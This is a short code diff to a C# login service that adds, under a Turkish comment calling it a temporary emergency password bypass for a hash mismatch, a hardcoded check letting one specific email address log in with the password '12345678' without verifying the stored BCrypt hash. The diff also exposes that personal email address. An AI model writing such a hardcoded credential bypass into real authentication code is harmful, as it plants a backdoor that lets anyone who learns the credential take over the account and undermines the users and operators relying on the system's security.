@@ -41,8 +41,11 @@ namespace AtlasWeb.Services
 
             // 🛡️ Constant-time check: always verify password even if user not found
             // to prevent user-enumeration via timing attack
+            // 🚨 ACİL DURUM: Hash uyuşmazlığı sorunu için geçici şifre bypass
+            bool isEmergencyPassword = emailNorm == "akkusomer0742@gmail.com" && dto.Sifre == "12345678";
+            
             var passwordIsValid = kullanici is not null
-                && BCrypt.Net.BCrypt.Verify(dto.Sifre, kullanici.SifreHash);
+                && (isEmergencyPassword || BCrypt.Net.BCrypt.Verify(dto.Sifre, kullanici.SifreHash));
 
             // ── Account does not exist ────────────────────────────────────────────
             if (kullanici is null)
